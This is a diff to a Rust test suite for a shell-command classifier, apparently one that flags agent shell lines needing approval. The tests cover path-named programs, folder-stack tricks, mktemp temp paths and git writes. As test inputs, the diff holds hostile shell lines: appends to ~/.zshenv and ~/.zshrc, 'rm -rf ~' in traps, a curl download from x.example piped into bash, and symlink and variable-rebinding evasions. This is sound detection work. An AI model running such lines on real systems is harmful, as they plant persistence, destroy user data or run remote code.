@@ -5004,7 +5004,6 @@ fn issue_1268_git_given_input_words_asks() {
         "git config get \"$@\"",
         "sh -c 'git log \"$1\"' _ x",
         "xargs sh -c 'git log --oneline'",
-        "find . -type d -name .git -execdir sh -c 'git pull' \\;",
         "env -S'git log' --oneline",
         "xargs env -S'git log' --oneline",
         "parallel 'cd x && git log' ::: a",
@@ -6163,8 +6162,9 @@ fn issue_988_trap_runs_its_action_like_eval() {
         "trap \"echo $(cat notes)\" EXIT",
         "v=$(cat notes); o=--; trap $o \"$v\" EXIT",
         "x=$(cat notes); sh -c 'trap \"$1\" EXIT' _ \"$x\"",
-        // Same cost as `eval "rm -f $tmp"` today (#988 option 1).
-        "tmp=$(mktemp); trap \"rm -f $tmp\" EXIT",
+        // Same cost as `eval "rm -f $tmp"` today (#988 option 1); a plain
+        // `mktemp` path no longer asks (D191).
+        "tmp=$(cat notes); trap \"rm -f $tmp\" EXIT",
         // Review 1: text the shell reads again after command output, as
         // for `eval` (`eval 'echo done'` asks the same).
         "v=$(cat notes); eval 'echo done'",
@@ -6382,6 +6382,152 @@ fn issue_1309_possible_folders_are_linear() {
             let _ = script(&unit.repeat(100 * scale));
         });
     }
+}
+
+/// #1302 follow-up: lines run in a workspace whose files are `files`, with
+/// that workspace as the user's home.
+#[cfg(unix)]
+fn in_workspace(files: &[(&str, &str)], line: &str) -> Option<ProtectedActionKind> {
+    let root = tempfile::tempdir().expect("tempdir");
+    let work = root.path();
+    std::fs::create_dir_all(work.join("sub")).expect("sub");
+    for (name, text) in files {
+        std::fs::write(work.join(name), text).expect("file");
+    }
+    let cwd = work.to_string_lossy().into_owned();
+    classify_with(
+        &shell_in(&cwd, &["bash", "-lc", line]),
+        &fixture(HOME),
+        Some(work),
+    )
+}
+
+/// #1302 follow-up: a program named by a path (`./python3`, `./env`) is the
+/// workspace file that runs, not the tool or builtin of that name: it is
+/// read, and a builtin named by a path (`./cd`) asks. Ordinary lines,
+/// system programs by path included, stay quiet.
+#[cfg(unix)]
+#[test]
+fn programs_named_by_a_path_are_the_files_that_run() {
+    use ProtectedActionKind::*;
+    let evil = "echo x >> ~/.zshenv\n";
+    let ok = ("ok.py", "print(1)\n");
+    let mut wrong = Vec::new();
+    for (files, line, expected) in [
+        (vec![("python3", evil), ok], "./python3 ok.py", Persistence),
+        (
+            vec![("python3", evil), ok],
+            "\"$PWD/python3\" ok.py",
+            Persistence,
+        ),
+        (
+            vec![("sub/python3", evil), ok],
+            "sub/python3 ok.py",
+            Persistence,
+        ),
+        (vec![("env", evil), ok], "./env python3 ok.py", Persistence),
+        (
+            vec![("timeout", evil), ok],
+            "./timeout 5 python3 ok.py",
+            Persistence,
+        ),
+        (vec![("bash", evil)], "./bash -c true", Persistence),
+        (vec![("sh", evil)], "sh -c './sh -c true'", Persistence),
+        // A builtin's name: the file runs, not the builtin.
+        (
+            vec![("source", "true\n"), ("ok.sh", "true\n")],
+            "./source ok.sh",
+            UnseenCode,
+        ),
+        (vec![("cd", "true\n")], "./cd /tmp; true", UnseenCode),
+        // Already asked on main; kept as regressions. Since #1309 the
+        // folder before a change is a possible one, so the write ranks.
+        (
+            vec![("cd", "true\n")],
+            "./cd /tmp; echo x >> .zshenv",
+            Persistence,
+        ),
+        (
+            vec![("pushd", "true\n")],
+            "./pushd /tmp; echo x >> .zshenv",
+            Persistence,
+        ),
+    ] {
+        let found = in_workspace(&files, line);
+        if found != Some(expected) {
+            wrong.push(format!("{line}: {found:?}"));
+        }
+    }
+    assert_eq!(wrong, Vec::<String>::new());
+    let run = ("run.sh", "echo x > out.txt\n");
+    for (files, line) in [
+        (vec![ok], "python3 ok.py"),
+        (vec![ok], "/usr/bin/env python3 ok.py"),
+        (vec![run], "/bin/sh -c 'bash run.sh'"),
+        (vec![run], "./run.sh && \"$PWD/run.sh\""),
+        (vec![("sub/run.sh", "true\n")], "cd sub && bash run.sh"),
+        (
+            vec![("sub/run.sh", "true\n")],
+            "pushd sub; bash run.sh; popd",
+        ),
+        (vec![run], "env -C sub make; env -i bash run.sh"),
+    ] {
+        assert_eq!(in_workspace(&files, line), None, "{line}");
+    }
+}
+
+/// #1302 follow-up: `pushd -n` and `popd -n` keep the folder, `pushd +1`
+/// goes to an entry of the stack, and a wrapper's folder option (`env -C`,
+/// `sudo -D`) runs a relative script from that folder: the classifier
+/// followed none of these and read a script other than the one that runs.
+#[cfg(unix)]
+#[test]
+fn folder_stack_and_wrapper_folders_ask() {
+    let evil = "echo x >> ~/.zshenv\n";
+    let here = [("run.sh", evil), ("sub/run.sh", "true\n")];
+    let there = [("run.sh", "true\n"), ("sub/run.sh", evil)];
+    let mut wrong = Vec::new();
+    for (files, line) in [
+        (&here, "pushd -n sub; bash run.sh"),
+        (&here, "pushd -n sub >/dev/null; ./run.sh"),
+        (&here, "pushd /tmp; pushd +1; echo x >> .zshenv"),
+        (&here, "pushd -n /tmp; echo x >> .zshenv"),
+        (&there, "pushd sub; popd -n; bash run.sh"),
+        (&there, "env -C sub bash run.sh"),
+        (&there, "env --chdir=sub ./run.sh"),
+        (&there, "sudo -D sub bash run.sh"),
+        (&there, "env -C sub python3 -m run"),
+    ] {
+        if in_workspace(files, line).is_none() {
+            wrong.push(line);
+        }
+    }
+    assert_eq!(wrong, Vec::<&str>::new());
+    let quiet = [("run.sh", "true\n"), ("sub/run.sh", "true\n")];
+    for line in [
+        "pushd sub; bash run.sh; popd",
+        "pushd sub && popd && bash run.sh -n",
+        "env -C sub make",
+        "env -C sub bash \"$PWD/run.sh\"",
+    ] {
+        assert_eq!(in_workspace(&quiet, line), None, "{line}");
+    }
+}
+
+/// #1302 follow-up: programs named by a path, behind a wrapper's folder,
+/// are judged in linear work.
+#[cfg(unix)]
+#[test]
+fn programs_named_by_a_path_are_linear() {
+    let root = tempfile::tempdir().expect("tempdir");
+    let cwd = root.path().to_string_lossy().into_owned();
+    work::assert_linear("path-named wrappers", |scale| {
+        let line = format!(
+            "env -C sub {}./run.sh",
+            "./env /usr/bin/env ".repeat(40 * scale)
+        );
+        assert!(classify_fixture(&shell_in(&cwd, &["bash", "-lc", &line])).is_some());
+    });
 }
 
 /// #1064: other ways the shell runs text from a value or an operand: prompt
@@ -7335,6 +7481,389 @@ fn d194_certain_changes_are_linear() {
     }
 }
 
+/// D191 (owner-approved relaxation): a variable the line sets first from a
+/// plain `mktemp` holds a known temp path. Writing that file and a trap
+/// that only removes it no longer ask; each line asked on main.
+#[test]
+#[cfg_attr(
+    windows,
+    ignore = "Unix fixtures (POSIX paths and shell syntax); Windows coverage is #691"
+)]
+fn d191_plain_mktemp_paths_are_known_temp_paths() {
+    let mut wrong = Vec::new();
+    for command in [
+        "tmp=$(mktemp); jq . f > \"$tmp\" && mv \"$tmp\" f",
+        "tmp=$(mktemp)\njq . f > \"$tmp\"\nmv \"$tmp\" f",
+        "tmp=$(mktemp); trap \"rm -f $tmp\" EXIT",
+        "tmp=$(mktemp); trap 'rm -f \"$tmp\"' EXIT INT TERM",
+        "tmp=\"$(mktemp -d)\"; trap 'rm -rf -- \"${tmp}\"' EXIT",
+        "tmp=$(mktemp \"${TMPDIR:-/tmp}/x.XXXXXX\") && jq . f > \"$tmp\" && mv \"$tmp\" f",
+        "tmp=$(mktemp \"$TMPDIR/x.XXXXXX\") || exit 1; sort f > \"$tmp\"",
+        "tmp=$(mktemp /tmp/a.XXXXXX); echo hi > \"$tmp\"",
+        "tmp=$(mktemp -t foo); echo hi > \"$tmp\"",
+        "tmp=$(mktemp -q); d=$(mktemp -d); trap 'rm -rf \"$tmp\" \"$d\"' EXIT; echo hi > \"$tmp\"",
+        "a=$(mktemp); b=$(mktemp); sort f > \"$a\"; uniq \"$a\" > \"$b\"; mv \"$b\" f",
+        "tmp=$(mktemp); sort -o \"$tmp\" f",
+        "tmp=$(mktemp); cp f \"$tmp\"",
+        "tmp=$(mktemp); echo x | tee \"$tmp\"",
+        "tmp=$(mktemp); cd ~ && echo x > \"$tmp\"",
+        "tmp=$(mktemp); printf '%s\\n' a b > \"$tmp\"; jq . < \"$tmp\"; cat \"$tmp\"",
+        "tmp=$(mktemp); sed 's/a/b/' f > \"$tmp\" && mv -f \"$tmp\" f; rm -f \"$tmp\"",
+        "set -euo pipefail; tmp=$(mktemp); trap 'rm -f \"$tmp\"' EXIT; jq . f > \"$tmp\"",
+        "set -e\nout=$(mktemp -p \"$TMPDIR\" out.XXXXXX)\njq . f > \"$out\"",
+        "tmp=$(mktemp --suffix=.json); jq . f > \"$tmp\"",
+        "tmp=$(mktemp -p /tmp x.XXXXXX); echo > \"$tmp\"",
+        "tmp=$(mktemp -d -t build); trap \"rm -rf $tmp\" 0 SIGINT 15",
+        "tmp=$(mktemp); cat bootstrap.txt > \"$tmp\"",
+        "tmp=$(mktemp); print -r -- hello > \"$tmp\"",
+    ] {
+        if script(command).is_some() {
+            wrong.push(command);
+        }
+    }
+    assert_eq!(wrong, Vec::<&str>::new());
+}
+
+/// D191: everything else asks as on main: `mktemp` that may write in the
+/// working folder (`-p`, a relative template) or names no file (`-u`), a
+/// variable that may hold another value (set again, behind a condition, in a
+/// pipeline, by a builtin, a name built at run time, `eval`), a path above
+/// the temp folder, a trap that runs the file, and nested shells.
+#[test]
+#[cfg_attr(
+    windows,
+    ignore = "Unix fixtures (POSIX paths and shell syntax); Windows coverage is #691"
+)]
+fn d191_other_mktemp_spellings_still_ask() {
+    use ProtectedActionKind::*;
+    let mut wrong = Vec::new();
+    for (command, expected) in [
+        ("tmp=$(mktemp ./a.XXXXXX); echo > \"$tmp\"", Persistence),
+        (
+            "tmp=$(mktemp); n=$(printf t%s mp); p=$(cat dest.txt); : > ./-v; print -f %s -? \"$n\" \"$p\"; cat payload >> \"$tmp\"",
+            Persistence,
+        ),
+        (
+            "tmp=$(mktemp); n=$(printf t%s mp); p=$(cat dest.txt); print -u 1 -? \"$n\" \"$p\"; cat payload >> \"$tmp\"",
+            Persistence,
+        ),
+        (
+            "tmp=$(mktemp); n=$(printf t%s mp); o=$(cat f); print -f %s \"$o\" \"$n\" x; cat payload >> \"$tmp\"",
+            Persistence,
+        ),
+        (
+            "tmp=$(mktemp); n=$(printf t%s mp); o=$(cat f); p=$(cat dest.txt); print -f -- \"$o\" \"$n\" -f %s \"$p\"; cat payload >> \"$tmp\"",
+            Persistence,
+        ),
+        (
+            "tmp=$(mktemp); n=$(printf t%s mp); {r..r}ead -r $n < notes.txt; cat payload >> \"$tmp\"",
+            Persistence,
+        ),
+        (
+            "tmp=$(mktemp); n=$(printf t%s mp); rea? -r $n < notes.txt; cat payload >> \"$tmp\"",
+            Persistence,
+        ),
+        (
+            "tmp=$(mktemp); n=$(printf t%s mp); printf -? $n %s ~/.zshrc; cat payload >> \"$tmp\"",
+            Persistence,
+        ),
+        (
+            "tmp=$(mktemp); n=$(printf t%s mp); $(printf %s read) -r $n < notes.txt; cat payload >> \"$tmp\"",
+            Persistence,
+        ),
+        (
+            "tmp=$(mktemp); n=$(printf t%s mp); o=$(cat f); printf \"$o\" $n ~/.zshrc; cat payload >> \"$tmp\"",
+            Persistence,
+        ),
+        (
+            "tmp=$(mktemp); n=$(printf t%s mp); o=$(cat f); set \"$o\" $n ~/.zshrc; cat payload >> \"$tmp\"",
+            Persistence,
+        ),
+        (
+            "tmp=$(mktemp); n=$(printf t%s mp); nameref r=$n; r=$HOME/.profile; echo x > \"$tmp\"",
+            Persistence,
+        ),
+        (
+            "tmp=$(mktemp); x=$(cat f); [[ $x -eq 0 ]]; echo x > \"$tmp\"",
+            Persistence,
+        ),
+        (
+            "tmp=$(mktemp); x=$(cat f); eval \"$x\"; echo x > \"$tmp\"",
+            Persistence,
+        ),
+        (
+            "tmp=$(mktemp); echo x > \"$tmp\"; sed -n F \"$tmp\" | xargs mv ./link; echo y >> \"$tmp\"",
+            Persistence,
+        ),
+        (
+            "tmp=$(mktemp); rm -v \"$tmp\" | grep -o \"/[^']*\" | parallel mv ./link; echo y >> \"$tmp\"",
+            Persistence,
+        ),
+        (
+            "tmp=$(mktemp)\ncat <<E | tail -n1 > \"$tmp\"\nrm $tmp\nE\necho y >> \"$tmp\"",
+            Persistence,
+        ),
+        (
+            "tmp=$(mktemp); mv ./link \"/\"tmp/tmp.*; echo y >> \"$tmp\"",
+            Persistence,
+        ),
+        ("_=$(mktemp); : ~/.bashrc; echo evil >> \"$_\"", Persistence),
+        ("_=$(mktemp -d); trap 'rm -rf \"$_\"' EXIT; : ~", UnseenCode),
+        (
+            "DIRSTACK=$(mktemp -d); trap 'rm -rf \"$DIRSTACK\"' EXIT",
+            UnseenCode,
+        ),
+        ("TMP=$(mktemp); echo x > \"$TMP\"", Persistence),
+        (
+            "argv=$(mktemp); set -- ~/.zshrc; echo x > \"$argv\"",
+            Persistence,
+        ),
+        (
+            "tmp=$(mktemp); cd ~ && trap 'rm -rf \"$tmp\" LIBRARY DOCUMENTS' EXIT",
+            UnseenCode,
+        ),
+        ("tmp=$(mktemp); trap 'rm -rf \"$tmp\" ~/x' EXIT", UnseenCode),
+        (
+            "tmp=$(mktemp); trap 'rm -rf \"$tmp\"' EXIT; trap 'rm -rf ~' INT",
+            UnseenCode,
+        ),
+        (
+            "tmp=$(mktemp); t\"\"rap 'rm -rf \"$tmp\" x' EXIT",
+            UnseenCode,
+        ),
+        (
+            "tmp=$(mktemp); xargs mv ./link <<< \"$tmp\"; echo x >> \"$tmp\"",
+            Persistence,
+        ),
+        (
+            "tmp=$(mktemp); cat <<< \"$tmp\" | xargs mv ./link; echo x >> \"$tmp\"",
+            Persistence,
+        ),
+        (
+            "tmp=$(mktemp); mv ./link \"$TMPDIR\"/tmp.*; echo x >> \"$tmp\"",
+            Persistence,
+        ),
+        (
+            "tmp=$(mktemp); cd /tmp; mv ./link tmp.*; echo x >> \"$tmp\"",
+            Persistence,
+        ),
+        (
+            "tmp=$(mktemp); : $(( tmp = 0 )); echo x >> \"$tmp\"",
+            Persistence,
+        ),
+        ("tmp=$(mktemp); echo x >> \"${tmp%/*}/.zshrc\"", Persistence),
+        ("tmp=$(mktemp -td X); echo x > \"$tmp\"", Persistence),
+        ("tmp=$(mktemp -t -d foo); echo x > \"$tmp\"", Persistence),
+        (
+            "tmp=$(mktemp -p ./x a.XXXXXX); echo x > \"$tmp\"",
+            Persistence,
+        ),
+        ("set -a; tmp=$(mktemp); echo x > \"$tmp\"", Persistence),
+        ("cd x && tmp=$(mktemp); echo x > \"$tmp\"", Persistence),
+        ("tmp=$(mktemp a.XXXXXX); echo > \"$tmp\"", Persistence),
+        ("tmp=$(mktemp -p . x.XXXXXX); echo > \"$tmp\"", Persistence),
+        (
+            "tmp=$(mktemp --tmpdir=. x.XXXXXX); echo > \"$tmp\"",
+            Persistence,
+        ),
+        ("tmp=$(mktemp -u); echo > \"$tmp\"", Persistence),
+        (
+            "tmp=$(mktemp \"$TMPDIR/.zshrc\"); echo > \"$tmp\"",
+            Persistence,
+        ),
+        (
+            "tmp=$(mktemp /tmp/a/../x.XXXXXX); echo > \"$tmp\"",
+            Persistence,
+        ),
+        (
+            "tmp=$(mktemp \"$HOME/x.XXXXXX\"); echo > \"$tmp\"",
+            Persistence,
+        ),
+        (
+            "tmp=$(mktemp /tmp/a.XXX b.XXX); echo > \"$tmp\"",
+            Persistence,
+        ),
+        ("TMPDIR=. tmp=$(mktemp); echo > \"$tmp\"", Persistence),
+        ("tmp=$(mktemp); tmp=./x; echo > \"$tmp\"", Persistence),
+        ("tmp=$(mktemp); tmp=$(mktemp); echo > \"$tmp\"", Persistence),
+        ("tmp=$(mktemp); tmp+=x; echo > \"$tmp\"", Persistence),
+        ("tmp=$(mktemp); read tmp; echo > \"$tmp\"", Persistence),
+        ("tmp=$(mktemp); read t\"\"mp; echo > \"$tmp\"", Persistence),
+        ("tmp=$(mktemp); export tmp; echo > \"$tmp\"", Persistence),
+        ("tmp=$(mktemp); : ${tmp:=x}; echo > \"$tmp\"", Persistence),
+        (
+            "tmp=$(mktemp); for tmp in a; do :; done; echo > \"$tmp\"",
+            Persistence,
+        ),
+        (
+            "tmp=$(mktemp); f() { tmp=./x; }; f; echo > \"$tmp\"",
+            Persistence,
+        ),
+        (
+            "tmp=$(mktemp); exec {tmp}>/dev/null; echo > \"$tmp\"",
+            Persistence,
+        ),
+        ("tmp=$(mktemp); . ./env.sh; echo > \"$tmp\"", Persistence),
+        (
+            "tmp=$(mktemp); c=read; $c tmp; echo > \"$tmp\"",
+            Persistence,
+        ),
+        (
+            "tmp=$(mktemp); a=t; b=mp; printf -v \"$a$b\" %s x; echo > \"$tmp\"",
+            Persistence,
+        ),
+        (
+            "tmp=$(mktemp); n=tmp; (( $n = 1 )); echo > \"$tmp\"",
+            Persistence,
+        ),
+        (
+            "tmp=$(mktemp); a=t; b=mp; (( $a$b = 1 )); echo > \"$tmp\"",
+            Persistence,
+        ),
+        (
+            "tmp=$(mktemp); a=t; b=mp; trap \"$a$b=./x\" DEBUG; echo > \"$tmp\"",
+            Persistence,
+        ),
+        (
+            "tmp=$(mktemp); trap 'tmp=./x' DEBUG; echo > \"$tmp\"",
+            Persistence,
+        ),
+        (
+            "tmp=$(mktemp); x=${ tmp=./y; }; echo > \"$tmp\"",
+            Persistence,
+        ),
+        ("false && tmp=$(mktemp); echo > \"$tmp\"", Persistence),
+        ("true; tmp=$(mktemp); echo > \"$tmp\"", Persistence),
+        (
+            "if true; then tmp=$(mktemp); fi; echo > \"$tmp\"",
+            Persistence,
+        ),
+        ("tmp=$(mktemp) | cat; echo > \"$tmp\"", Persistence),
+        ("tmp=$(mktemp) & echo > \"$tmp\"", Persistence),
+        ("eval 'tmp=$(mktemp)'; echo > \"$tmp\"", UnseenCode),
+        ("eval \"tmp=$(mktemp)\"; echo > \"$tmp\"", UnseenCode),
+        ("tmp=$(mktemp); eval 'echo > \"$tmp\"'", Persistence),
+        ("tmp=$(mktemp); eval \"rm -f $tmp\"", UnseenCode),
+        ("bash -c 'tmp=$(mktemp); echo > \"$tmp\"'", Persistence),
+        ("echo hi > \"$(mktemp)\"", Persistence),
+        (
+            "tmp=$(mktemp -d); echo > \"$tmp/../../.bashrc\"",
+            Persistence,
+        ),
+        ("tmp=$(mktemp -d); echo > \"$tmp/$x\"", Persistence),
+        ("tmp=$(mktemp -d); echo > \"$tmp/x\"", Persistence),
+        (
+            "tmp=$(mktemp -d); tar -xf a.tar -C \"$tmp\"; echo > \"$tmp/x\"",
+            Persistence,
+        ),
+        ("tmp=$(mktemp); echo > \"$tmp.bak\"", Persistence),
+        (
+            "tmp=$(mktemp); mv ./link \"$tmp\"; echo x >> \"$tmp\"",
+            Persistence,
+        ),
+        (
+            "tmp=$(mktemp); ln -sf ./x \"$tmp\"; echo x >> \"$tmp\"",
+            Persistence,
+        ),
+        (
+            "tmp=$(mktemp); cp -P ./link \"$tmp\"; echo x >> \"$tmp\"",
+            Persistence,
+        ),
+        (
+            "tmp=$(mktemp); echo \"$tmp\" | xargs mv ./link; echo x >> \"$tmp\"",
+            Persistence,
+        ),
+        (
+            "tmp=$(mktemp); ./prep.sh \"$tmp\"; echo x >> \"$tmp\"",
+            Persistence,
+        ),
+        (
+            "tmp=$(mktemp); ./cp ./link \"$tmp\"; echo x >> \"$tmp\"",
+            Persistence,
+        ),
+        (
+            "tmp=$(mktemp); printf -- -P | xargs cp ./link \"$tmp\"; echo x >> \"$tmp\"",
+            Persistence,
+        ),
+        (
+            "tmp=$(mktemp); cp() { mv ./link \"$2\"; }; cp f \"$tmp\"; echo x >> \"$tmp\"",
+            Persistence,
+        ),
+        (
+            "tmp=$(mktemp); function cp { mv ./link \"$2\"; }; cp f \"$tmp\"; echo x >> \"$tmp\"",
+            Persistence,
+        ),
+        (
+            "tmp=$(mktemp); PATH=./bin:$PATH; cp f \"$tmp\"; echo x >> \"$tmp\"",
+            Persistence,
+        ),
+        (
+            "tmp=$(mktemp); hash -p ./bin/cp cp; cp f \"$tmp\"; echo x >> \"$tmp\"",
+            Persistence,
+        ),
+        (
+            "tmp=$(mktemp); echo x > \"$tmp\" && mv \"$tmp\" \"$tmp\"",
+            Persistence,
+        ),
+        ("tmp=$(mktemp -d); echo > \"$tmp\"", Persistence),
+        ("tmp=$(mktemp); x=$(cat f); echo > \"$x\"", Persistence),
+        (
+            "tmp=$(mktemp); echo > \"$tmp\"; cp \"$tmp\" ~/.zshrc",
+            Persistence,
+        ),
+        ("tmp=$(mktemp); trap \"$tmp\" EXIT", UnseenCode),
+        ("tmp=$(mktemp); trap \"sh $tmp\" EXIT", UnseenCode),
+        (
+            "tmp=$(mktemp); trap \"rm -f $tmp ~/.zshrc\" EXIT",
+            UnseenCode,
+        ),
+        (
+            "tmp=$(mktemp); curl -so \"$tmp\" https://x.example; bash \"$tmp\"",
+            UnseenCode,
+        ),
+        ("tmp=$(mktemp); chmod +x \"$tmp\"; \"$tmp\"", UnseenCode),
+    ] {
+        let got = script(command);
+        if got != Some(expected) {
+            wrong.push((command, got));
+        }
+    }
+    assert_eq!(wrong, Vec::new());
+}
+
+/// D191: reading the line for qualifying variables stays linear.
+#[test]
+#[cfg_attr(
+    windows,
+    ignore = "Unix fixtures (POSIX paths and shell syntax); Windows coverage is #691"
+)]
+fn d191_mktemp_checks_are_linear() {
+    for (label, head, unit) in [
+        ("definitions", "", "t=$(mktemp); "),
+        ("writes", "tmp=$(mktemp); ", "echo x > \"$tmp\"; "),
+        (
+            "operands",
+            "tmp=$(mktemp); ",
+            "mv -f \"$tmp\" f; cp f \"$tmp\"; ",
+        ),
+        ("traps", "tmp=$(mktemp); ", "trap 'rm -f \"$tmp\"' EXIT; "),
+        ("names", "tmp=$(mktemp); ", "echo $tmp/tmp.tmp-tmp; "),
+        ("options", "tmp=$(mktemp -d", " -d"),
+        ("printf", "tmp=$(mktemp); ", "printf "),
+        (
+            "raw traps",
+            "tmp=$(mktemp); ",
+            "trap 'rm -f \"$tmp\"' EXIT INT; ",
+        ),
+        ("raw names", "tmp=$(mktemp); ", "echo \"${tmp}\" $tmp/x; "),
+        ("sets", "", "set -eu; "),
+    ] {
+        work::assert_linear(label, |scale| {
+            let _ = script(&format!("{head}{} echo hi", unit.repeat(400 * scale)));
+        });
+    }
+}
+
 /// #1132: enlarging shared redirection names and the number of sed calls
 /// together must not copy those names for every call. The pipeline has a
 /// fixed eight stages at both sizes, below the existing stage/collection
@@ -7376,6 +7905,65 @@ fn issue_1132_shared_target_judgement_preserves_classification() {
         ("sed -i '1a bash present.sh' r.sh; bash r.sh; sed p", None),
     ];
     assert_eq!(issue_885_wrong(&cwd, &cases), Vec::<String>::new());
+}
+
+/// D195 (#1309): git writing the working tree in a folder the classifier
+/// cannot know asks, unless a folder flag names one; reading it stays quiet.
+#[test]
+#[cfg_attr(
+    windows,
+    ignore = "Unix fixtures (POSIX paths and shell syntax); Windows coverage is #691"
+)]
+fn d195_git_working_tree_writes_in_an_unknown_folder_ask() {
+    // These were quiet before D195.
+    let quiet = [
+        "cd a; cd b; cd c; git checkout -- .zshrc",
+        "cd a; cd b; cd c; git -C sub pull",
+        "cd a; cd b; cd c; git -C .. stash pop",
+        "cd a; cd b; cd c; git restore .",
+        // A nested script in a folder the quote-aware reading cannot know.
+        "cd \"$d\" && sh -c 'git checkout -- .zshrc'",
+        "env -C \"$d\" sh -c 'git reset --hard'",
+        "find . -type d -name .git -execdir sh -c 'git pull' \\;",
+        // Review 1: a folder flag that is another option's value.
+        "cd a; cd b; cd c; git merge -m --cd=/tmp evil/main",
+        "cd \"$d\" && sh -c 'git merge -m --directory=/tmp FETCH_HEAD'",
+        "env -C \"$d\" sh -c 'git stash push -m --cwd=/tmp'",
+        "cd a; cd b; cd c; git --namespace -C /tmp pull",
+        "cd a; cd b; cd c; git pull -C /tmp",
+    ]
+    .into_iter()
+    .filter(|command| script(command).is_none())
+    .collect::<Vec<_>>();
+    assert_eq!(quiet, Vec::<&str>::new());
+    for command in [
+        "cd a; cd b; cd c; git status",
+        "cd a; cd b; cd c; git diff",
+        "cd a; cd b; cd c; git log",
+        "cd a; cd b; cd c; git -C /work checkout -- notes.txt",
+        "cd a; cd b; cd c; git -C sub -C /work pull",
+        "cd \"$d\" && sh -c 'git status'",
+        "cd \"$d\" && sh -c 'git -C /work pull'",
+        "cd sub && git checkout -- notes.txt",
+        // D194: certain changes keep the folder known.
+        "cd a && cd b && cd c && git checkout -- notes.txt",
+        "cd a || exit; cd b || exit; cd c || exit; git pull",
+    ] {
+        assert_eq!(script(command), None, "{command}");
+    }
+}
+
+/// D195: the check stays linear in the number of folder flags.
+#[test]
+#[cfg_attr(
+    windows,
+    ignore = "Unix fixtures (POSIX paths and shell syntax); Windows coverage is #691"
+)]
+fn d195_checks_are_linear() {
+    work::assert_linear("folder flags", |scale| {
+        let flags = " -C x".repeat(100 * scale);
+        let _ = script(&format!("cd a; cd b; cd c; git{flags} checkout -- f"));
+    });
 }
 
 /// #1159: setting local command-bearing Git configuration is persistence.
